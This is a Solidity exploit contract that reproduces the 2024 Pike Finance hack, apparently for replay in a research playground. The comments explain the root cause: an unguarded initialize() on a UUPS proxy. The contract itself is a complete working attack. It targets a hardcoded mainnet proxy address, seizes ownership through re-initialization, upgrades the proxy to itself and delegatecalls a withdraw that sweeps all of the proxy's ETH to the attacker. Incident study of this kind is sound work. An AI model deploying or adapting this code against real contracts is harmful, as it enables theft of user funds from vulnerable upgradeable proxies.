// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-04-PikeFinance).
// The DeFiHackLabs PoC (test/PikeFinance_exp.sol) runs the whole attack INLINE
// in the Foundry test contract: `address(this)` is passed as every
// initialize() argument, as the upgradeToAndCall() `newImplementation`, and as
// the withdraw() recipient, and `withdraw`/`proxiableUUID`/`receive` are all
// implemented on the test contract itself. There is no standalone contract to
// deploy as-is. This file is a faithful, self-contained copy of that inline
// attack (logic and constants copied verbatim from
// PikeFinance.testExploit/withdraw/proxiableUUID) so the playground can
// deploy it and record run().
//
// Root cause (real Pike Finance hack, Ethereum, 2024-04-24, tx
// 0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431):
// PikeFinanceProxy is a UUPS-style upgradeable proxy whose initialize(owner,
// wNative, uniswapHelper, token, swapFee, withdrawFee) had no effective
// re-initialization guard, even though the proxy was already initialized and
// operational (owner = Pike's multisig, holding 479.39 ETH in custody). The
// attacker calls initialize() directly to overwrite the owner storage slot
// with its own address, then calls upgradeToAndCall(attackerImpl,
// withdraw(attacker)): UUPS's _authorizeUpgrade reads "owner" from the very
// slot initialize() just overwrote, so the check passes, the ERC-1967
// implementation slot is rewritten to the attacker's contract, and the
// upgrade's `data` is delegatecalled into the proxy -- running withdraw()
// with `address(this) == the proxy`, sweeping its entire 479.39 ETH balance.

interface IPikeFinanceProxy {
    function initialize(address, address, address, address, uint16, uint16) external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract PikeFinanceDrain {
    address constant PIKE_FINANCE_PROXY = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    // Recorded entrypoint: mirrors testExploit() exactly.
    // - Step 1: initialize() the already-initialized proxy, overwriting the
    //   owner (and other config) storage slots with THIS contract's address.
    // - Step 2: upgradeToAndCall() the proxy to point at THIS contract as the
    //   new implementation, delegatecalling withdraw(address(this)) in the
    //   same transaction. _authorizeUpgrade's onlyOwner check now reads the
    //   owner slot this contract just seized in step 1, so it passes.
    function run() external {
        address self = address(this);

        IPikeFinanceProxy(PIKE_FINANCE_PROXY).initialize(self, self, self, self, 20, 20);

        bytes memory data = abi.encodeWithSignature("withdraw(address)", self);
        IPikeFinanceProxy(PIKE_FINANCE_PROXY).upgradeToAndCall(self, data);
    }

    // Runs under the PROXY's storage context via delegatecall (triggered by
    // upgradeToAndCall's `data` argument, from inside run() above). `this`
    // resolves to the proxy, so `address(this).balance` is the proxy's ENTIRE
    // custodial ETH balance -- forwarded here to `addr` (this same contract),
    // where receive() below simply collects it.
    function withdraw(address addr) external {
        (bool success,) = payable(addr).call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    // UUPS requires the new implementation to expose proxiableUUID() and
    // return the canonical ERC-1967 implementation slot, to confirm it is a
    // genuine UUPS-compatible target before accepting the upgrade.
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}
